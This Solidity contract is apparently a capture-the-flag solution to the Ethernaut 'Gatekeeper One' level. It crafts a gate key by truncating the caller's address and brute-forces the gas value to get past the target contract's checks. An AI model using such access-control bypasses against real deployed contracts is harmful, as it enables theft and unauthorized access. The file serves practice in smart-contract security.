// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./contract.sol";

contract GatekeeperHack {
    GatekeeperOne public original =
        GatekeeperOne(0x1839A7252b988c8358352C7C55A88b8D2CB015C6);

    function getValue() public view returns (bytes8) {
        bytes8 data = bytes8(uint64(uint16(uint160(msg.sender))));
        return bytes8(data);
    }

    function getFinalValue() public view returns (bytes8) {
        bytes8 data = bytes8(uint64(getValue()) + 54043195528445950);
        return data;
    }

    function checkValue(bytes8 _gateKey) public view returns (bool) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        return true;
    }

    function hack() public {
        bytes8 gateKey = getFinalValue();

        for (uint256 i = 0; i <= 8191; i++) {
            try original.enter{gas: 800000 + i}(gateKey) {
                break;
            } catch {}
        }
    }
}
